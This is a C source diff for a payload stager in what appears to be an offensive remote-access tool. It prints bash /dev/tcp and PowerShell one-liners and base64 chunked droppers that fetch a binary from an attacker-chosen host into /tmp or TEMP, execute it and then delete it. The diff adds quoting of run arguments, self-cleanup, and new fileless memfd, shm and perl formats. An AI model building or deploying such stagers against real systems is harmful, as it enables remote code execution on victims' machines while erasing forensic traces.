@@ -10,6 +10,7 @@
 #endif
 
 #include "od_stager.h"
+#include "od_stager_stub.h"
 #include "od_socket.h"
 #include "od_log.h"
 
@@ -69,7 +70,7 @@ static uint8_t *stager_read_file(const char *path, size_t *out_len) {
 static const char BASE64_TABLE[] =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-static char *stager_base64_encode(const uint8_t *data, size_t len, size_t *out_len) {
+char *od_stager_base64_encode(const uint8_t *data, size_t len, size_t *out_len) {
     size_t olen = 4 * ((len + 2) / 3);
     char *out = (char *)malloc(olen + 1);
     if (!out) return NULL;
@@ -112,8 +113,11 @@ static int stager_handle_authed(socket_t cfd, const uint8_t *binary, size_t bina
         od_log_warn("stager: failed to read handshake");
         return -1;
     }
-    uint32_t magic = ntohl(*(uint32_t *)hdr);
-    uint32_t tlen  = ntohl(*(uint32_t *)(hdr + 4));
+    uint32_t magic_raw, tlen_raw;
+    memcpy(&magic_raw, hdr, 4);
+    memcpy(&tlen_raw, hdr + 4, 4);
+    uint32_t magic = ntohl(magic_raw);
+    uint32_t tlen  = ntohl(tlen_raw);
 
     if (magic != OD_STAGER_MAGIC) {
         od_log_warn("stager: bad magic 0x%08x", magic);
@@ -231,8 +235,14 @@ int od_run_stager_server(const endpoint_t *listen_ep,
 static void generate_oneliner_linux(const char *host, uint16_t port, const char *run_args) {
     printf("bash -c 'exec 3<>/dev/tcp/%s/%u;cat<&3>/tmp/.s;chmod +x /tmp/.s;/tmp/.s",
            host, (unsigned)port);
-    if (run_args && run_args[0]) printf(" %s", run_args);
-    printf("'\n");
+    if (run_args && run_args[0]) {
+        printf(" ");
+        for (const char *p = run_args; *p; p++) {
+            if (*p == '\'') printf("'\\''");
+            else putchar(*p);
+        }
+    }
+    printf(";rm -f /tmp/.s'\n");
 }
 
 static void generate_oneliner_windows(const char *host, uint16_t port, const char *run_args) {
@@ -245,8 +255,15 @@ static void generate_oneliner_windows(const char *host, uint16_t port, const cha
            "[IO.File]::WriteAllBytes($p,$m.ToArray());"
            "& $p",
            host, (unsigned)port);
-    if (run_args && run_args[0]) printf(" %s", run_args);
-    printf("\n");
+    if (run_args && run_args[0]) {
+        printf(" '");
+        for (const char *p = run_args; *p; p++) {
+            if (*p == '\'') printf("''");
+            else putchar(*p);
+        }
+        printf("'");
+    }
+    printf(";Remove-Item -Force $p\n");
 }
 
 /* ── stager generate: base64 mini-stager ─────────────────────── */
@@ -271,7 +288,8 @@ static uint8_t *stager_find_sentinel(uint8_t *bin, size_t bin_len,
 }
 
 static void stager_output_b64_chunked(const char *b64, size_t b64_len,
-                                      const char *os_name) {
+                                      const char *os_name,
+                                      const char *run_args) {
     size_t chunks = (b64_len + STAGER_CHUNK_CHARS - 1) / STAGER_CHUNK_CHARS;
 
     if (strcmp(os_name, "linux") == 0) {
@@ -283,7 +301,15 @@ static void stager_output_b64_chunked(const char *b64, size_t b64_len,
             fwrite(b64 + off, 1, n, stdout);
             printf("'>>/tmp/.b\n");
         }
-        printf("base64 -d /tmp/.b>/tmp/.s;rm /tmp/.b;chmod +x /tmp/.s;/tmp/.s\n");
+        printf("base64 -d /tmp/.b>/tmp/.s;rm /tmp/.b;chmod +x /tmp/.s;/tmp/.s");
+        if (run_args && run_args[0]) {
+            printf(" ");
+            for (const char *p = run_args; *p; p++) {
+                if (*p == '\'') printf("'\\''");
+                else putchar(*p);
+            }
+        }
+        printf(";rm -f /tmp/.s\n");
     } else {
         size_t off;
         for (off = 0; off < b64_len; off += STAGER_CHUNK_CHARS) {
@@ -297,8 +323,18 @@ static void stager_output_b64_chunked(const char *b64, size_t b64_len,
             fwrite(b64 + off, 1, n, stdout);
             printf("'\n");
         }
-        printf("[IO.File]::WriteAllBytes(\"$env:TEMP\\.s.exe\","
-               "[Convert]::FromBase64String($b));& \"$env:TEMP\\.s.exe\"\n");
+        printf("$p=\"$env:TEMP\\.s.exe\";"
+               "[IO.File]::WriteAllBytes($p,"
+               "[Convert]::FromBase64String($b));& $p");
+        if (run_args && run_args[0]) {
+            printf(" '");
+            for (const char *p = run_args; *p; p++) {
+                if (*p == '\'') printf("''");
+                else putchar(*p);
+            }
+            printf("'");
+        }
+        printf(";Remove-Item -Force $p\n");
     }
 
     od_log_info("stager: base64 mini-stager %zu chars in %zu chunks (os=%s)",
@@ -307,7 +343,8 @@ static void stager_output_b64_chunked(const char *b64, size_t b64_len,
 
 static int generate_base64_ministager(const char *host, uint16_t port,
                                       const char *token,
-                                      const char *os_name) {
+                                      const char *os_name,
+                                      const char *run_args) {
     if (strcmp(os_name, "linux") != 0) {
         od_log_error("stager: base64 mini-stager only supports linux for now");
         return 1;
@@ -340,14 +377,14 @@ static int generate_base64_ministager(const char *host, uint16_t port,
     memcpy(p, token, strlen(token));
 
     size_t b64_len = 0;
-    char *b64 = stager_base64_encode(payload, payload_len, &b64_len);
+    char *b64 = od_stager_base64_encode(payload, payload_len, &b64_len);
     free(payload);
     if (!b64) {
         od_log_error("stager: base64 encode failed");
         return 1;
     }
 
-    stager_output_b64_chunked(b64, b64_len, os_name);
+    stager_output_b64_chunked(b64, b64_len, os_name, run_args);
     free(b64);
     return 0;
 }
@@ -359,6 +396,11 @@ int od_run_stager_generate(const char *connect_host, uint16_t connect_port,
                            const char *os_name,
                            const char *format,
                            const char *run_args) {
+    if (strcmp(format, "list") == 0) {
+        od_stager_print_formats(os_name);
+        return 0;
+    }
+
     if (strcmp(format, "oneliner") == 0) {
         if (strcmp(os_name, "linux") == 0) {
             generate_oneliner_linux(connect_host, connect_port, run_args);
@@ -368,5 +410,26 @@ int od_run_stager_generate(const char *connect_host, uint16_t connect_port,
         return 0;
     }
 
-    return generate_base64_ministager(connect_host, connect_port, token, os_name);
+    if (strcmp(format, "base64") == 0) {
+        return generate_base64_ministager(connect_host, connect_port, token,
+                                          os_name, run_args);
+    }
+
+    if (strcmp(format, "stub") == 0 || strcmp(format, "stub-shm") == 0 ||
+        strcmp(format, "stub-memfd") == 0 || strcmp(format, "perl-memfd") == 0) {
+        if (strcmp(os_name, "linux") != 0) {
+            od_log_error("stager: format '%s' is linux-only", format);
+            return 1;
+        }
+        if (strcmp(format, "stub") == 0)
+            return od_stager_generate_stub_disk(connect_host, connect_port, run_args);
+        if (strcmp(format, "stub-shm") == 0)
+            return od_stager_generate_stub_shm(connect_host, connect_port, run_args);
+        if (strcmp(format, "stub-memfd") == 0)
+            return od_stager_generate_stub_memfd(connect_host, connect_port, run_args);
+        return od_stager_generate_perl_memfd(connect_host, connect_port, run_args);
+    }
+
+    od_log_error("stager: unknown format '%s'", format);
+    return 1;
 }
